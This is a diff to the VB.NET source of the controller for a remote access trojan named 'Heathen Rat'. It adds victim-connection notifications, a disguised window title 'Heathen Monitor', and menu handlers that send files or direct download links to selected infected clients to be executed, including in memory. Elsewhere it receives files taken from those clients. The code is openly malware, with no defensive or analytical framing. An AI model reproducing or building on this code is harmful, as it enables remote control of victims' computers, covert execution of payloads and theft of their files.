@@ -23,13 +23,17 @@ Public Class Heathen
             While (True)
                 Dim NouveauClient As TcpClient = MonServeur.AcceptTcpClient()
                 LesClients.Add(NouveauClient)
+                NotifyIcon1.BalloonTipText = "New Connection from : " & NouveauClient.Client.RemoteEndPoint.ToString
+                NotifyIcon1.BalloonTipTitle = "Heathen"
+                NotifyIcon1.ShowBalloonTip(500)
+
+
                 Dim it As New ListViewItem(NouveauClient.Client.RemoteEndPoint.ToString)
 
                 ComboBox1.Items.Add(NouveauClient.Client.RemoteEndPoint.ToString)
 
                 ListView1.Items.Add(it)
 
-                '   counteur = counteur + 1
                 Task.Run(Sub() LireLesMessages(NouveauClient.GetStream(), "", Context)) 'Si t'as pas de Task.Run donc utilise Task.Factory.StartNew()
             End While
         Catch ex As Exception
@@ -57,6 +61,7 @@ Public Class Heathen
                         lvi.SubItems.Add(iddd)
 
                         counteur = counteur + 1
+
 
                     ElseIf Message.EndsWith("Deco") Then
                         '  MessageBox.Show(Message)
@@ -214,6 +219,9 @@ Public Class Heathen
 
                 RichTextBox1.Text = String.Empty
 
+
+
+                IO.File.Delete("Task.txt")
                 ''Success Or Not to delete file
             ElseIf RichTextBox1.Text.EndsWith("folderSS") Then
                 Dim op As String = RichTextBox1.Text
@@ -247,7 +255,7 @@ Public Class Heathen
             ElseIf RichTextBox1.Text.Contains("\>/TheFileToWrite") Then
                 Dim thebase64() = Split(RichTextBox1.Text, "\>/TheFileToWrite")
                 Dim name As String() = Split(thebase64(1), "\")
-                MessageBox.Show(name(name.Length - 1))
+                ' MessageBox.Show(name(name.Length - 1))
                 Await Task.Run(Sub() GetTheFile(thebase64(0), name(name.Length - 1)))
 
             ElseIf RichTextBox1.Text.StartsWith("System") Then
@@ -268,6 +276,7 @@ Public Class Heathen
     Public Sub GetTheFile(ByVal file As String, ByVal Name As String)
         Dim o As New Random
         IO.File.WriteAllBytes(Name, Convert.FromBase64String(file))
+        RichTextBox1.Text = String.Empty
     End Sub
     Public Sub NoSuccesWiththisFolder()
         MessageBox.Show("Couldn't go on with this folder. Need probably UAC or the folder has been deleted")
@@ -515,6 +524,8 @@ Public Class Heathen
         Label5.Text = "Hello " + Environment.UserName + " !" + " Welcome to Heathen Rat !"
         '  Dim j As String = Nothing
         Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 20, 20))
+        Me.Text = "Heathen Monitor"
+
     End Sub
 
 
@@ -1273,6 +1284,140 @@ Public Class Heathen
 
             Next
 
+        End If
+    End Sub
+
+    Private Sub FromFileComputerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromFileComputerToolStripMenuItem.Click
+        If FileDial.ShowDialog = DialogResult.OK Then
+            Dim oa As String = Convert.ToBase64String(IO.File.ReadAllBytes(FileDial.FileName))
+            Dim q = FileDial.SafeFileName
+            If (LesClients.Count > 0) Then
+
+
+
+
+
+                Dim allstr As String = oa + "\\ExecuteAsProcess//" + q
+
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+                For Each h In ListView1.SelectedItems
+                    '     MessageBox.Show(h.ToString)
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+
+                Next
+
+                For Each client As TcpClient In LesClients
+
+                    If lk = client.Client.RemoteEndPoint.ToString Then
+                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+
+            End If
+        End If
+    End Sub
+
+    Private Sub FromDirectDownloadLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDirectDownloadLinkToolStripMenuItem.Click
+        Dim k As String = InputBox("Put a direct download link : ")
+        Dim oa As String = k
+        Dim q = InputBox("Put the extension : ")
+        If (LesClients.Count > 0) Then
+
+
+
+
+
+            Dim allstr As String = oa + "\\ExecuteAsLink//" + q
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+                For Each h In ListView1.SelectedItems
+                    '     MessageBox.Show(h.ToString)
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+
+                Next
+
+                For Each client As TcpClient In LesClients
+
+                    If lk = client.Client.RemoteEndPoint.ToString Then
+                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+
+            End If
+
+    End Sub
+
+    Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles NotifyIcon1.MouseDoubleClick
+        Me.Show()
+    End Sub
+
+    Private Sub NotifyIcon1_Click(sender As Object, e As EventArgs) Handles NotifyIcon1.Click
+        Me.Show()
+    End Sub
+
+    Private Sub FromFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromFileToolStripMenuItem1.Click
+        If FileDial.ShowDialog = DialogResult.OK Then
+            Dim oa As String = Convert.ToBase64String(IO.File.ReadAllBytes(FileDial.FileName))
+
+            If (LesClients.Count > 0) Then
+
+
+
+
+
+                Dim allstr As String = oa + "\\ExecuteInMemoFromPC//"
+
+                Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)
+                For Each h In ListView1.SelectedItems
+                    '     MessageBox.Show(h.ToString)
+                    Dim o As String = h.ToString.Replace("ListViewItem: ", "")
+                    Dim odd As String = o.Replace("{", "")
+                    Dim odd2 As String = odd.Replace("}", "")
+                    Dim odd3() As String = Split(odd2, ":")
+
+                    lk = odd2
+
+                Next
+
+                For Each client As TcpClient In LesClients
+
+                    If lk = client.Client.RemoteEndPoint.ToString Then
+                        '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
+                        Try
+                            client.GetStream().Write(buffer, 0, buffer.Length) '''
+                        Catch ex As Exception
+
+                            MessageBox.Show("The client seems to be offline")
+                        End Try
+                    End If
+
+                Next
+
+            End If
         End If
     End Sub
 End Class
